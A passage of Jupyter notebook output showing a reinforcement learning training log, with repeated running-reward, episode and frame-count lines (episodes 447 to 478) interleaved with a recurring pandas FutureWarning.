      "Running reward: 11.00\t Episode 447\t Frame count: 244600\t Context: 2\n",
      "Running reward: 11.00\t Episode 447\t Frame count: 244700\t Context: 2\n",
      "Running reward: 11.00\t Episode 448\t Frame count: 244800\t Context: 1\n",
      "Running reward: 11.00\t Episode 448\t Frame count: 244900\t Context: 1\n",
      "Running reward: 11.00\t Episode 449\t Frame count: 245000\t Context: 1\n",
      "Running reward: 11.00\t Episode 449\t Frame count: 245100\t Context: 1\n",
      "Running reward: 11.00\t Episode 449\t Frame count: 245200\t Context: 1\n",
      "Running reward: 11.00\t Episode 449\t Frame count: 245300\t Context: 2\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 245400\t Context: 1\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 245500\t Context: 1\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 245600\t Context: 1\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 245700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 450\t Frame count: 245800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 450\t Frame count: 245900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 450\t Frame count: 246000\t Context: 1\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 246100\t Context: 1\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 246200\t Context: 1\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 246300\t Context: 1\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 246400\t Context: 1\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 246500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 450\t Frame count: 246600\t Context: 2\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 246700\t Context: 2\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 246800\t Context: 2\n",
      "Running reward: 11.00\t Episode 450\t Frame count: 246900\t Context: 2\n",
      "Running reward: 11.00\t Episode 451\t Frame count: 247000\t Context: 1\n",
      "Running reward: 11.00\t Episode 451\t Frame count: 247100\t Context: 2\n",
      "Running reward: 11.00\t Episode 452\t Frame count: 247200\t Context: 2\n",
      "Running reward: 11.00\t Episode 452\t Frame count: 247300\t Context: 2\n",
      "Running reward: 11.00\t Episode 452\t Frame count: 247400\t Context: 2\n",
      "Running reward: 11.00\t Episode 452\t Frame count: 247500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 452\t Frame count: 247600\t Context: 2\n",
      "Running reward: 11.00\t Episode 452\t Frame count: 247700\t Context: 2\n",
      "Running reward: 11.00\t Episode 452\t Frame count: 247800\t Context: 2\n",
      "Running reward: 11.00\t Episode 452\t Frame count: 247900\t Context: 2\n",
      "Running reward: 11.00\t Episode 453\t Frame count: 248000\t Context: 1\n",
      "Running reward: 11.00\t Episode 453\t Frame count: 248100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 454\t Frame count: 248200\t Context: 1\n",
      "Running reward: 11.00\t Episode 454\t Frame count: 248300\t Context: 2\n",
      "Running reward: 11.00\t Episode 454\t Frame count: 248400\t Context: 2\n",
      "Running reward: 11.00\t Episode 454\t Frame count: 248500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 454\t Frame count: 248600\t Context: 2\n",
      "Running reward: 11.00\t Episode 454\t Frame count: 248700\t Context: 2\n",
      "Running reward: 11.00\t Episode 454\t Frame count: 248800\t Context: 2\n",
      "Running reward: 11.00\t Episode 454\t Frame count: 248900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 455\t Frame count: 249000\t Context: 1\n",
      "Running reward: 11.00\t Episode 455\t Frame count: 249100\t Context: 2\n",
      "Running reward: 11.00\t Episode 455\t Frame count: 249200\t Context: 2\n",
      "Running reward: 11.00\t Episode 456\t Frame count: 249300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 456\t Frame count: 249400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 456\t Frame count: 249500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 456\t Frame count: 249600\t Context: 2\n",
      "Running reward: 11.00\t Episode 456\t Frame count: 249700\t Context: 2\n",
      "Running reward: 11.00\t Episode 456\t Frame count: 249800\t Context: 2\n",
      "Running reward: 11.00\t Episode 456\t Frame count: 249900\t Context: 2\n",
      "Running reward: 11.00\t Episode 456\t Frame count: 250000\t Context: 2\n",
      "Running reward: 11.00\t Episode 457\t Frame count: 250100\t Context: 1\n",
      "Running reward: 11.00\t Episode 457\t Frame count: 250200\t Context: 1\n",
      "Running reward: 11.00\t Episode 457\t Frame count: 250300\t Context: 1\n",
      "Running reward: 11.00\t Episode 457\t Frame count: 250400\t Context: 2\n",
      "Running reward: 11.00\t Episode 457\t Frame count: 250500\t Context: 2\n",
      "Running reward: 11.00\t Episode 457\t Frame count: 250600\t Context: 2\n",
      "Running reward: 11.00\t Episode 458\t Frame count: 250700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 458\t Frame count: 250800\t Context: 1\n",
      "Running reward: 11.00\t Episode 458\t Frame count: 250900\t Context: 1\n",
      "Running reward: 11.00\t Episode 458\t Frame count: 251000\t Context: 1\n",
      "Running reward: 11.00\t Episode 458\t Frame count: 251100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 458\t Frame count: 251200\t Context: 1\n",
      "Running reward: 11.00\t Episode 458\t Frame count: 251300\t Context: 2\n",
      "Running reward: 11.00\t Episode 458\t Frame count: 251400\t Context: 2\n",
      "Running reward: 11.00\t Episode 458\t Frame count: 251500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 459\t Frame count: 251600\t Context: 1\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 251700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 459\t Frame count: 251800\t Context: 1\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 251900\t Context: 1\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 252000\t Context: 1\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 252100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 459\t Frame count: 252200\t Context: 2\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 252300\t Context: 2\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 252400\t Context: 2\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 252500\t Context: 2\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 252600\t Context: 2\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 252700\t Context: 2\n",
      "Running reward: 11.00\t Episode 459\t Frame count: 252800\t Context: 2\n",
      "Running reward: 11.00\t Episode 460\t Frame count: 252900\t Context: 2\n",
      "Running reward: 11.00\t Episode 460\t Frame count: 253000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 461\t Frame count: 253100\t Context: 1\n",
      "Running reward: 11.00\t Episode 461\t Frame count: 253200\t Context: 1\n",
      "Running reward: 11.00\t Episode 461\t Frame count: 253300\t Context: 1\n",
      "Running reward: 11.00\t Episode 461\t Frame count: 253400\t Context: 1\n",
      "Running reward: 11.00\t Episode 461\t Frame count: 253500\t Context: 2\n",
      "Running reward: 11.00\t Episode 462\t Frame count: 253600\t Context: 1\n",
      "Running reward: 11.00\t Episode 462\t Frame count: 253700\t Context: 1\n",
      "Running reward: 11.00\t Episode 462\t Frame count: 253800\t Context: 2\n",
      "Running reward: 11.00\t Episode 463\t Frame count: 253900\t Context: 1\n",
      "Running reward: 11.00\t Episode 463\t Frame count: 254000\t Context: 1\n",
      "Running reward: 11.00\t Episode 463\t Frame count: 254100\t Context: 2\n",
      "Running reward: 11.00\t Episode 463\t Frame count: 254200\t Context: 2\n",
      "Running reward: 11.00\t Episode 463\t Frame count: 254300\t Context: 2\n",
      "Running reward: 11.00\t Episode 463\t Frame count: 254400\t Context: 2\n",
      "Running reward: 11.00\t Episode 463\t Frame count: 254500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 464\t Frame count: 254600\t Context: 1\n",
      "Running reward: 11.00\t Episode 464\t Frame count: 254700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 464\t Frame count: 254800\t Context: 1\n",
      "Running reward: 11.00\t Episode 464\t Frame count: 254900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 464\t Frame count: 255000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 465\t Frame count: 255100\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 255200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 465\t Frame count: 255300\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 255400\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 255500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 465\t Frame count: 255600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 465\t Frame count: 255700\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 255800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 465\t Frame count: 255900\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 256000\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 256100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 465\t Frame count: 256200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 465\t Frame count: 256300\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 256400\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 256500\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 256600\t Context: 1\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 256700\t Context: 2\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 256800\t Context: 2\n",
      "Running reward: 11.00\t Episode 465\t Frame count: 256900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 466\t Frame count: 257000\t Context: 2\n",
      "Running reward: 11.00\t Episode 466\t Frame count: 257100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 467\t Frame count: 257200\t Context: 1\n",
      "Running reward: 11.00\t Episode 467\t Frame count: 257300\t Context: 1\n",
      "Running reward: 11.00\t Episode 467\t Frame count: 257400\t Context: 2\n",
      "Running reward: 11.00\t Episode 468\t Frame count: 257500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 468\t Frame count: 257600\t Context: 2\n",
      "Running reward: 11.00\t Episode 469\t Frame count: 257700\t Context: 1\n",
      "Running reward: 11.00\t Episode 469\t Frame count: 257800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 469\t Frame count: 257900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 469\t Frame count: 258000\t Context: 1\n",
      "Running reward: 11.00\t Episode 469\t Frame count: 258100\t Context: 1\n",
      "Running reward: 11.00\t Episode 469\t Frame count: 258200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 469\t Frame count: 258300\t Context: 2\n",
      "Running reward: 11.00\t Episode 469\t Frame count: 258400\t Context: 2\n",
      "Running reward: 11.00\t Episode 470\t Frame count: 258500\t Context: 2\n",
      "Running reward: 11.00\t Episode 471\t Frame count: 258600\t Context: 2\n",
      "Running reward: 11.00\t Episode 471\t Frame count: 258700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 471\t Frame count: 258800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 471\t Frame count: 258900\t Context: 2\n",
      "Running reward: 11.00\t Episode 471\t Frame count: 259000\t Context: 2\n",
      "Running reward: 11.00\t Episode 471\t Frame count: 259100\t Context: 2\n",
      "Running reward: 11.00\t Episode 471\t Frame count: 259200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 471\t Frame count: 259300\t Context: 2\n",
      "Running reward: 11.00\t Episode 471\t Frame count: 259400\t Context: 2\n",
      "Running reward: 11.00\t Episode 472\t Frame count: 259500\t Context: 2\n",
      "Running reward: 11.00\t Episode 473\t Frame count: 259600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 473\t Frame count: 259700\t Context: 1\n",
      "Running reward: 11.00\t Episode 473\t Frame count: 259800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 474\t Frame count: 259900\t Context: 1\n",
      "Running reward: 11.00\t Episode 474\t Frame count: 260000\t Context: 1\n",
      "Running reward: 11.00\t Episode 474\t Frame count: 260100\t Context: 1\n",
      "Running reward: 11.00\t Episode 474\t Frame count: 260200\t Context: 1\n",
      "Running reward: 11.00\t Episode 474\t Frame count: 260300\t Context: 1\n",
      "Running reward: 11.00\t Episode 474\t Frame count: 260400\t Context: 2\n",
      "Running reward: 11.00\t Episode 474\t Frame count: 260500\t Context: 2\n",
      "Running reward: 11.00\t Episode 474\t Frame count: 260600\t Context: 2\n",
      "Running reward: 11.00\t Episode 474\t Frame count: 260700\t Context: 2\n",
      "Running reward: 11.00\t Episode 474\t Frame count: 260800\t Context: 2\n",
      "Running reward: 11.00\t Episode 475\t Frame count: 260900\t Context: 1\n",
      "Running reward: 11.00\t Episode 475\t Frame count: 261000\t Context: 1\n",
      "Running reward: 11.00\t Episode 475\t Frame count: 261100\t Context: 1\n",
      "Running reward: 11.00\t Episode 475\t Frame count: 261200\t Context: 2\n",
      "Running reward: 11.00\t Episode 475\t Frame count: 261300\t Context: 2\n",
      "Running reward: 11.00\t Episode 475\t Frame count: 261400\t Context: 2\n",
      "Running reward: 11.00\t Episode 476\t Frame count: 261500\t Context: 1\n",
      "Running reward: 11.00\t Episode 476\t Frame count: 261600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 476\t Frame count: 261700\t Context: 1\n",
      "Running reward: 11.00\t Episode 476\t Frame count: 261800\t Context: 1\n",
      "Running reward: 11.00\t Episode 476\t Frame count: 261900\t Context: 2\n",
      "Running reward: 11.00\t Episode 476\t Frame count: 262000\t Context: 2\n",
      "Running reward: 11.00\t Episode 477\t Frame count: 262100\t Context: 1\n",
      "Running reward: 11.00\t Episode 478\t Frame count: 262200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
